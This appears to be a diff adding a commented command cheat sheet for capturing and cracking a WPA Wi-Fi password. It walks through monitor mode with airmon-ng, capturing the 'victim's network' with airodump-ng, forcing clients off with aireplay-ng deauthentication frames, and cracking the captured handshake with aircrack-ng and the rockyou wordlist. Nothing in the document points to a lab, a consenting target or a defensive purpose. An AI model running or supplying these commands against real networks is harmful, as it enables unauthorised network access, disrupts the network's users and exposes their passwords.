@@ -1,0 +1,21 @@
+
+sudo -i # to be root
+
+iwconfig # to see your network adapters
+
+airmon-ng start 'selected adapter' # to put your wireless adapter in monitor mode
+                                   # for exemple our wireless adapter's name is wlan0
+                                   # we will have a new adapter called wlan0mon
+                                   
+airodump-ng wlan0mon # to see all other network
+
+airodump-ng --bssid 'mac adress of victim's network' -c 'channel of victim's network' -w 'the destination of recorded file'
+# for exemple: airodump-ng --bssid 1A:2B:3C:4D:5E -c 12 -w /home/kali/test wlan0mon
+
+# launch another terminal in root and type :
+aireplay-ng -0 'number of deauth requests' -a 1A:2B:3C:4D:5E wlan0mon # this command will send some deauth requests at all clients of this network
+
+# after some times, you will see handshake at upper right in your airodump terminal and press CTRL+C
+
+#finaly, you can have the password by
+aircrack-ng -w /usr/share/wordlist/rockyou.txt /home/kali/test.cap
